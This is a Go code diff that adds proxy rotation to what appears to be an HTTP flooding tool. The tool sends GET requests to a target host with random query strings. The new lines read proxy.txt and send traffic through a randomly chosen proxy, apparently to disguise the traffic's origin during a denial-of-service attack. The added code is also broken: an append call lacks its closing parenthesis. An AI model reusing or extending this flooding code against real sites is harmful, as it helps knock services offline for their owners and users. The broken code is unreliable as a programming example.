@@ -49,9 +49,35 @@ func get() {
 	} else {
 		param_joiner = "?"
 	}
+	
+	// Baca file proxy list
+	proxyFile, err := os.Open("proxy.txt")
+	if err != nil {
+		fmt.Println("Error opening proxy list file:", err)
+		return
+	}
+	defer proxyFile.Close()
+
+	var proxyURLs []*url.URL
+	scanner := bufio.NewScanner(proxyFile)
+	for scanner.Scan() {
+		proxyStr := "http://" + scanner.Text() // Format proxy string
+		proxyURL, err := url.Parse(proxyStr)
+		if err != nil {
+			fmt.Println("Error parsing proxy URL:", err)
+			continue
+		}
+		proxyURLs = append(proxyURLs, proxyURL
+	 }
+
+	         
+	transport := &http.Transport{
+		Proxy: http.ProxyURL(proxyURLs[rand.Intn(len(proxyURLs))]), // Use random proxy from the list
+		}
 
 	c := http.Client{
 		Timeout: 3500 * time.Millisecond,
+		Transport: transport,
 	}
 
 	req, err := http.NewRequest("GET", host+param_joiner+buildblock(rand.Intn(80)+3)+"="+buildblock(rand.Intn(7)+3), nil)
